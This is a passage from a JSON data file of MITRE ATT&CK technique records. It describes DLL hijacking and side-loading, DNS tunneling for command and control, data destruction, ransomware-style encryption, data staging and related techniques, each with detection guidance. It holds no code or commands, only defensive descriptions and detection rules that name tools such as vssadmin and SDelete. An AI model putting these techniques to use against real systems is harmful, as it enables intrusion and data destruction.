Redirection\",\"url\":\"https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-redirection?redirectedfrom=MSDN\"},{\"description\":\"Microsoft. (n.d.). Manifests. Retrieved December 5, 2014.\",\"source_name\":\"Microsoft Manifests\",\"url\":\"https://msdn.microsoft.com/en-US/library/aa375365\"},{\"description\":\"Nick Harbour. (2010, September 1). DLL Search Order Hijacking Revisited. Retrieved March 13, 2020.\",\"source_name\":\"FireEye DLL Search Order Hijacking\",\"url\":\"https://www.fireeye.com/blog/threat-research/2010/08/dll-search-order-hijacking-revisited.html\"}],\"id\":\"attack-pattern--2fee9321-3e71-4cf4-af24-d4d40d355b34\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-03-26T16:13:58.862Z\",\"name\":\"DLL Search Order Hijacking\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Travis Smith, Tripwire\",\"Stefan Kanthak\"],\"x_mitre_data_sources\":[\"Process command-line parameters\",\"Process monitoring\",\"DLL monitoring\",\"File monitoring\"],\"x_mitre_detection\":\"Monitor file systems for moving, renaming, replacing, or modifying DLLs. Changes in the set of DLLs that are loaded by a process (compared with past behavior) that do not correlate with known software, patches, etc., are suspicious. Monitor DLLs loaded into a process and detect DLLs that have the same file name but abnormal paths. Modifications to or creation of .manifest and .local redirection files that do not correlate with software updates are suspicious.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:58.007Z\",\"external_references\":[{\"external_id\":\"T1073\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1073\"},{\"external_id\":\"CAPEC-641\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/641.html\"},{\"description\":\"Microsoft. (n.d.). Manifests. Retrieved June 3, 2016.\",\"source_name\":\"MSDN Manifests\",\"url\":\"https://msdn.microsoft.com/en-us/library/aa375365\"},{\"description\":\"Stewart, A. (2014). DLL SIDE-LOADING: A Thorn in the Side of the Anti-Virus Industry. Retrieved November 12, 2014.\",\"source_name\":\"Stewart 2014\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf\"}],\"id\":\"attack-pattern--b2001907-166b-4d71-bb3c-9d26c871de09\",\"modified\":\"2020-03-20T14:28:39.529Z\",\"name\":\"DLL Side-Loading\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2020-03-13T19:41:37.908Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may execute their own malicious payloads by hijacking the library manifest used to load DLLs. Adversaries may take advantage of vague references in the library manifest of a program by replacing a legitimate library with a malicious one, causing the operating system to load their malicious library when it is called for by the victim program.\\n\\nPrograms may specify DLLs that are loaded at runtime. Programs that improperly or vaguely specify a required DLL may be open to a vulnerability in which an unintended DLL is loaded. Side-loading vulnerabilities specifically occur when Windows Side-by-Side (WinSxS) manifests (Citation: About Side by Side Assemblies) are not explicit enough about characteristics of the DLL to be loaded. Adversaries may take advantage of a legitimate program that is vulnerable by replacing the legitimate DLL with a malicious one.  (Citation: FireEye DLL Side-Loading)\\n\\nAdversaries likely use this technique as a means of masking actions they perform under a legitimate, trusted system or software process.\",\"external_references\":[{\"external_id\":\"T1574.002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1574/002\"},{\"external_id\":\"CAPEC-capec\",\"source_name\":\"capec\",\"url\":\"https://capec.mitre.org/data/definitions/capec.html\"},{\"description\":\"Microsoft. (2018, May 31). About Side-by-Side Assemblies. Retrieved March 13, 2020.\",\"source_name\":\"About Side by Side Assemblies\",\"url\":\"https://docs.microsoft.com/en-us/windows/win32/sbscs/about-side-by-side-assemblies-\"},{\"description\":\"Amanda Steward. (2014). FireEye DLL Side-Loading: A Thorn in the Side of the Anti-Virus Industry. Retrieved March 13, 2020.\",\"source_name\":\"FireEye DLL Side-Loading\",\"url\":\"https://www.fireeye.com/content/dam/fireeye-www/global/en/current-threats/pdfs/rpt-dll-sideloading.pdf\"}],\"id\":\"attack-pattern--e64c62cf-9cd7-4a14-94ec-cdaac43ab44b\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"persistence\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"privilege-escalation\"},{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"defense-evasion\"}],\"modified\":\"2020-06-20T22:05:42.513Z\",\"name\":\"DLL Side-Loading\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Loaded DLLs\",\"Process monitoring\",\"Process use of network\"],\"x_mitre_defense_bypassed\":[\"Anti-virus\",\"Application control\"],\"x_mitre_detection\":\"Monitor processes for unusual activity (e.g., a process that does not use the network begins to do so). Track DLL metadata, such as a hash, and compare DLLs that are loaded at process execution time against previous executions to detect differences that do not correlate with patching or updates.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-15T16:27:31.768Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may communicate using the Domain Name System (DNS) application layer protocol to avoid detection/network filtering by blending in with existing traffic. Commands to the remote system, and often the results of those commands, will be embedded within the protocol traffic between the client and server. \\n\\nThe DNS protocol serves an administrative function in computer networking and thus may be very common in environments. DNS traffic may also be allowed even before network authentication is completed. DNS packets contain many fields and headers in which data can be concealed. Often known as DNS tunneling, adversaries may abuse DNS to communicate with systems under their control within a victim network while also mimicking normal, expected traffic.(Citation: PAN DNS Tunneling)(Citation: Medium DnsTunneling) \",\"external_references\":[{\"external_id\":\"T1071.004\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1071/004\"},{\"description\":\"Palo Alto Networks. (n.d.). What Is DNS Tunneling?. Retrieved March 15, 2020.\",\"source_name\":\"PAN DNS Tunneling\",\"url\":\"https://www.paloaltonetworks.com/cyberpedia/what-is-dns-tunneling\"},{\"description\":\"Galobardes, R. (2018, October 30). Learn how easy is to bypass firewalls using DNS tunneling (and also how to block it). Retrieved March 15, 2020.\",\"source_name\":\"Medium DnsTunneling\",\"url\":\"https://medium.com/@galolbardes/learn-how-easy-is-to-bypass-firewalls-using-dns-tunneling-and-also-how-to-block-it-3ed652f4a000\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--1996eef1-ced3-4d7f-bf94-33298cabbf72\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-27T19:02:44.600Z\",\"name\":\"DNS\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Jan Petrov, Citi\"],\"x_mitre_data_sources\":[\"DNS records\",\"Netflow/Enclave netflow\",\"Process monitoring\",\"Process use of network\",\"Netflow/Enclave netflow\",\"Packet capture\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect application layer protocols that do not follow the expected protocol standards regarding syntax, structure, or any other variable adversaries could leverage to conceal data.(Citation: University of Birmingham C2)\\n\\nMonitor for DNS traffic to/from known-bad or suspicious domains.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-11T14:56:34.154Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may perform calculations on addresses returned in DNS results to determine which port and IP address to use for command and control, rather than relying on a predetermined port number or the actual returned IP address. A IP and/or port number calculation can be used to bypass egress filtering on a C2 channel.(Citation: Meyers Numbered Panda)\\n\\nOne implementation of [DNS Calculation](https://attack.mitre.org/techniques/T1568/003) is to take the first three octets of an IP address in a DNS response and use those values to calculate the port for command and control traffic.(Citation: Meyers Numbered Panda)(Citation: Moran 2014)(Citation: Rapid7G20Espionage)\",\"external_references\":[{\"external_id\":\"T1568.003\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1568/003\"},{\"description\":\"Meyers, A. (2013, March 29). Whois Numbered Panda. Retrieved January 14, 2016.\",\"source_name\":\"Meyers Numbered Panda\",\"url\":\"http://www.crowdstrike.com/blog/whois-numbered-panda/\"},{\"description\":\"Moran, N., Oppenheim, M., Engle, S., & Wartell, R.. (2014, September 3). Darwin’s Favorite APT Group &#91;Blog&#93;. Retrieved November 12, 2014.\",\"source_name\":\"Moran 2014\",\"url\":\"https://www.fireeye.com/blog/threat-research/2014/09/darwins-favorite-apt-group-2.html\"},{\"description\":\"Rapid7. (2013, August 26). Upcoming G20 Summit Fuels Espionage Operations. Retrieved March 6, 2017.\",\"source_name\":\"Rapid7G20Espionage\",\"url\":\"https://blog.rapid7.com/2013/08/26/upcoming-g20-summit-fuels-espionage-operations/\"}],\"id\":\"attack-pattern--83a766f8-1501-4b3a-a2de-2e2849e8dfc1\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-27T20:54:28.287Z\",\"name\":\"DNS Calculation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"DNS records\"],\"x_mitre_detection\":\"Detection for this technique is difficult because it would require knowledge of the specific implementation of the port calculation algorithm. Detection may be possible by analyzing DNS records if the algorithm is known.\",\"x_mitre_is_subtechnique\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:19.338Z\",\"external_references\":[{\"external_id\":\"T1002\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1002\"},{\"description\":\"Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.\",\"source_name\":\"Wikipedia File Header Signatures\",\"url\":\"https://en.wikipedia.org/wiki/List_of_file_signatures\"}],\"id\":\"attack-pattern--b9f5dbe2-4c55-4fc5-af2e-d42c1d182ec4\",\"modified\":\"2020-03-30T03:09:45.384Z\",\"name\":\"Data Compressed\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2019-03-14T18:47:17.701Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may destroy data and files on specific systems or in large numbers on a network to interrupt availability to systems, services, and network resources. Data destruction is likely to render stored data irrecoverable by forensic techniques through overwriting files or data on local and remote drives.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018)(Citation: Talos Olympic Destroyer 2018) Common operating system file deletion commands such as <code>del</code> and <code>rm</code> often only remove pointers to files without wiping the contents of the files themselves, making the files recoverable by proper forensic methodology. This behavior is distinct from [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) and [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) because individual files are destroyed rather than sections of a storage disk or the disk\'s logical structure.\\n\\nAdversaries may attempt to overwrite files and directories with randomly generated data to make it irrecoverable.(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) In some cases politically oriented image files have been used to overwrite data.(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)\\n\\nTo maximize impact on the target organization in operations where network-wide availability interruption is the goal, malware designed for destroying data may have worm-like features to propagate across a network by leveraging additional techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Talos Olympic Destroyer 2018)\",\"external_references\":[{\"external_id\":\"T1485\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1485\"},{\"description\":\"Symantec. (2012, August 16). The Shamoon Attacks. Retrieved March 14, 2019.\",\"source_name\":\"Symantec Shamoon 2012\",\"url\":\"https://www.symantec.com/connect/blogs/shamoon-attacks\"},{\"description\":\"FireEye. (2016, November 30). FireEye Responds to Wave of Destructive Cyber Attacks in Gulf Region. Retrieved January 11, 2017.\",\"source_name\":\"FireEye Shamoon Nov 2016\",\"url\":\"https://www.fireeye.com/blog/threat-research/2016/11/fireeye_respondsto.html\"},{\"description\":\"Falcone, R.. (2016, November 30). Shamoon 2: Return of the Disttrack Wiper. Retrieved January 11, 2017.\",\"source_name\":\"Palo Alto Shamoon Nov 2016\",\"url\":\"http://researchcenter.paloaltonetworks.com/2016/11/unit42-shamoon-2-return-disttrack-wiper/\"},{\"description\":\"Kaspersky Lab. (2017, March 7). From Shamoon to StoneDrill: Wipers attacking Saudi organizations and beyond. Retrieved March 14, 2019.\",\"source_name\":\"Kaspersky StoneDrill 2017\",\"url\":\"https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07180722/Report_Shamoon_StoneDrill_final.pdf\"},{\"description\":\"Falcone, R. (2018, December 13). Shamoon 3 Targets Oil and Gas Organization. Retrieved March 14, 2019.\",\"source_name\":\"Unit 42 Shamoon3 2018\",\"url\":\"https://unit42.paloaltonetworks.com/shamoon-3-targets-oil-gas-organization/\"},{\"description\":\"Mercer, W. and Rascagneres, P. (2018, February 12). Olympic Destroyer Takes Aim At Winter Olympics. Retrieved March 14, 2019.\",\"source_name\":\"Talos Olympic Destroyer 2018\",\"url\":\"https://blog.talosintelligence.com/2018/02/olympic-destroyer.html\"}],\"id\":\"attack-pattern--d45a3d09-b3cf-48f4-9f0f-f521ee5cb05c\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-27T21:08:19.783Z\",\"name\":\"Data Destruction\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and command-line parameters of binaries that could be involved in data destruction activity, such as [SDelete](https://attack.mitre.org/software/S0195). Monitor for the creation of suspicious files as well as high unusual file modification activity. In particular, look for large quantities of file modifications in user directories and under <code>C:\\\\Windows\\\\System32\\\\</code>.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"root\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:31:43.540Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may encode data to make the content of command and control traffic more difficult to detect. Command and control (C2) information can be encoded using a standard data encoding system. Use of data encoding may adhere to existing protocol specifications and includes use of ASCII, Unicode, Base64, MIME, or other binary-to-text and character encoding systems.(Citation: Wikipedia Binary-to-text Encoding) (Citation: Wikipedia Character Encoding) Some data encoding systems may also result in data compression, such as gzip.\",\"external_references\":[{\"external_id\":\"T1132\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1132\"},{\"description\":\"Wikipedia. (2016, December 26). Binary-to-text encoding. Retrieved March 1, 2017.\",\"source_name\":\"Wikipedia Binary-to-text Encoding\",\"url\":\"https://en.wikipedia.org/wiki/Binary-to-text_encoding\"},{\"description\":\"Wikipedia. (2017, February 19). Character Encoding. Retrieved March 1, 2017.\",\"source_name\":\"Wikipedia Character Encoding\",\"url\":\"https://en.wikipedia.org/wiki/Character_encoding\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--cc7b8c4e-9be0-47ca-b0bb-83915ec3ee2f\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-14T23:39:50.338Z\",\"name\":\"Data Encoding\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Itzik Kotler, SafeBreach\"],\"x_mitre_data_sources\":[\"Packet capture\",\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_permissions_required\":[\"User\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:30:30.260Z\",\"external_references\":[{\"external_id\":\"T1022\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1022\"},{\"description\":\"Zhang, H., Papadopoulos, C., & Massey, D. (2013, April). Detecting encrypted botnet traffic. Retrieved August 19, 2015.\",\"source_name\":\"Zhang 2013\",\"url\":\"http://www.netsec.colostate.edu/~zhang/DetectingEncryptedBotnetTraffic.pdf\"},{\"description\":\"Wikipedia. (2016, March 31). List of file signatures. Retrieved April 22, 2016.\",\"source_name\":\"Wikipedia File Header Signatures\",\"url\":\"https://en.wikipedia.org/wiki/List_of_file_signatures\"}],\"id\":\"attack-pattern--d54416bd-0803-41ca-870a-ce1af7c05638\",\"modified\":\"2020-03-30T03:10:12.750Z\",\"name\":\"Data Encrypted\",\"revoked\":true,\"type\":\"attack-pattern\"}",
    "{\"created\":\"2019-03-15T13:59:30.390Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may encrypt data on target systems or on large numbers of systems in a network to interrupt availability to system and network resources. They can attempt to render stored data inaccessible by encrypting files or data on local and remote drives and withholding access to a decryption key. This may be done in order to extract monetary compensation from a victim in exchange for decryption or a decryption key (ransomware) or to render data permanently inaccessible in cases where the key is not saved or transmitted.(Citation: US-CERT Ransomware 2016)(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)(Citation: US-CERT SamSam 2018) In the case of ransomware, it is typical that common user files like Office documents, PDFs, images, videos, audio, text, and source code files will be encrypted. In some cases, adversaries may encrypt critical system files, disk partitions, and the MBR.(Citation: US-CERT NotPetya 2017)\\n\\nTo maximize impact on the target organization, malware designed for encrypting data may have worm-like features to propagate across a network by leveraging other attack techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: FireEye WannaCry 2017)(Citation: US-CERT NotPetya 2017)\",\"external_references\":[{\"external_id\":\"T1486\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1486\"},{\"description\":\"US-CERT. (2016, March 31). Alert (TA16-091A): Ransomware and Recent Variants. Retrieved March 15, 2019.\",\"source_name\":\"US-CERT Ransomware 2016\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA16-091A\"},{\"description\":\"Berry, A., Homan, J., and Eitzman, R. (2017, May 23). WannaCry Malware Profile. Retrieved March 15, 2019.\",\"source_name\":\"FireEye WannaCry 2017\",\"url\":\"https://www.fireeye.com/blog/threat-research/2017/05/wannacry-malware-profile.html\"},{\"description\":\"US-CERT. (2017, July 1). Alert (TA17-181A): Petya Ransomware. Retrieved March 15, 2019.\",\"source_name\":\"US-CERT NotPetya 2017\",\"url\":\"https://www.us-cert.gov/ncas/alerts/TA17-181A\"},{\"description\":\"US-CERT. (2018, December 3). Alert (AA18-337A): SamSam Ransomware. Retrieved March 15, 2019.\",\"source_name\":\"US-CERT SamSam 2018\",\"url\":\"https://www.us-cert.gov/ncas/alerts/AA18-337A\"}],\"id\":\"attack-pattern--b80d107d-fa0d-4b60-9684-b0433e8bdba0\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-27T21:09:28.699Z\",\"name\":\"Data Encrypted for Impact\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Kernel drivers\",\"File monitoring\",\"Process command-line parameters\",\"Process monitoring\"],\"x_mitre_detection\":\"Use process monitoring to monitor the execution and command line parameters of of binaries involved in data destruction activity, such as vssadmin, wbadmin, and bcdedit. Monitor for the creation of suspicious files as well as unusual file modification activity. In particular, look for large quantities of file modifications in user directories.\\n\\nIn some cases, monitoring for unusual kernel driver installation activity can aid in detection.\",\"x_mitre_impact_type\":[\"Availability\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"root\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2020-03-02T14:19:22.609Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may insert, delete, or manipulate data in order to manipulate external outcomes or hide activity. By manipulating data, adversaries may attempt to affect a business process, organizational understanding, or decision making.\\n\\nThe type of modification and the impact it will have depends on the target application and process as well as the goals and objectives of the adversary. For complex systems, an adversary would likely need special expertise and possibly access to specialized software related to the system that would typically be gained through a prolonged information gathering campaign in order to have the desired impact.\",\"external_references\":[{\"external_id\":\"T1565\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1565\"}],\"id\":\"attack-pattern--ac9e6b22-11bf-45d7-9181-c1cb08360931\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"impact\"}],\"modified\":\"2020-03-28T23:16:20.202Z\",\"name\":\"Data Manipulation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Network protocol analysis\",\"File monitoring\",\"Application logs\"],\"x_mitre_detection\":\"Where applicable, inspect important file hashes, locations, and modifications for suspicious/unexpected values. With some critical processes involving transmission of data, manual or out-of-band integrity checking may be useful for identifying manipulated data.\",\"x_mitre_impact_type\":[\"Integrity\"],\"x_mitre_is_subtechnique\":false,\"x_mitre_permissions_required\":[\"User\",\"Administrator\",\"root\",\"SYSTEM\"],\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.0\"}",
    "{\"created\":\"2017-05-31T21:30:18.931Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may obfuscate command and control traffic to make it more difficult to detect. Command and control (C2) communications are hidden (but not necessarily encrypted) in an attempt to make the content more difficult to discover or decipher and to make the communication less conspicuous and hide commands from being seen. This encompasses many methods, such as adding junk data to protocol traffic, using steganography, or impersonating legitimate protocols. \",\"external_references\":[{\"external_id\":\"T1001\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1001\"},{\"description\":\"Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.\",\"source_name\":\"University of Birmingham C2\",\"url\":\"https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf\"}],\"id\":\"attack-pattern--ad255bfe-a9e6-4b52-a258-8d3462abe842\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"command-and-control\"}],\"modified\":\"2020-03-15T00:40:27.670Z\",\"name\":\"Data Obfuscation\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_data_sources\":[\"Packet capture\",\"Process use of network\",\"Process monitoring\",\"Network protocol analysis\"],\"x_mitre_detection\":\"Analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. (Citation: University of Birmingham C2)\",\"x_mitre_is_subtechnique\":false,\"x_mitre_network_requirements\":true,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\"],\"x_mitre_version\":\"1.1\"}",
    "{\"created\":\"2017-05-31T21:30:58.938Z\",\"created_by_ref\":\"identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5\",\"description\":\"Adversaries may stage collected data in a central location or directory prior to Exfiltration. Data may be kept in separate files or combined into one file through techniques such as [Archive Collected Data](https://attack.mitre.org/techniques/T1560). Interactive command shells may be used, and common functionality within [cmd](https://attack.mitre.org/software/S0106) and bash may be used to copy data into a staging location.(Citation: PWC Cloud Hopper April 2017)\\n\\nIn cloud environments, adversaries may stage data within a particular instance or virtual machine before exfiltration. An adversary may [Create Cloud Instance](https://attack.mitre.org/techniques/T1578/002) and stage data in that instance.(Citation: Mandiant M-Trends 2020)\\n\\nAdversaries may choose to stage data from a victim network in a centralized location prior to Exfiltration to minimize the number of connections made to their C2 server and better evade detection.\",\"external_references\":[{\"external_id\":\"T1074\",\"source_name\":\"mitre-attack\",\"url\":\"https://attack.mitre.org/techniques/T1074\"},{\"description\":\"PwC and BAE Systems. (2017, April). Operation Cloud Hopper. Retrieved April 5, 2017.\",\"source_name\":\"PWC Cloud Hopper April 2017\",\"url\":\"https://www.pwc.co.uk/cyber-security/pdf/cloud-hopper-report-final-v4.pdf\"},{\"description\":\"FireEye / Mandiant. (2020, February). M-Trends 2020. Retrieved April 24, 2020.\",\"source_name\":\"Mandiant M-Trends 2020\",\"url\":\"https://content.fireeye.com/m-trends/rpt-m-trends-2020\"}],\"id\":\"attack-pattern--7dd95ff6-712e-4056-9626-312ea4ab4c5e\",\"kill_chain_phases\":[{\"kill_chain_name\":\"mitre-attack\",\"phase_name\":\"collection\"}],\"modified\":\"2020-06-24T18:59:16.039Z\",\"name\":\"Data Staged\",\"object_marking_refs\":[\"marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168\"],\"type\":\"attack-pattern\",\"x_mitre_contributors\":[\"Praetorian\",\"Shane Tully, @securitygypsy\"],\"x_mitre_data_sources\":[\"File monitoring\",\"Process monitoring\",\"Process command-line parameters\"],\"x_mitre_detection\":\"Processes that appear to be reading files from disparate locations and writing them to the same directory or file may be an indication of data being staged, especially if they are suspected of performing encryption or compression on the files, such as 7zip, RAR, ZIP, or zlib. Monitor publicly writeable directories, central locations, and commonly used staging directories (recycle bin, temp folders, etc.) to regularly check for compressed or encrypted data that may be indicative of staging.\\n\\nMonitor processes and command-line arguments for actions that could be taken to collect and combine files. Remote access tools with built-in features may interact directly with the Windows API to gather and copy to a location. Data may also be acquired and staged through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\",\"x_mitre_is_subtechnique\":false,\"x_mitre_platforms\":[\"Linux\",\"macOS\",\"Windows\",\"AWS\",\"GCP\",\"Azure\"],\"x_mitre_version\":\"1.2\"}",
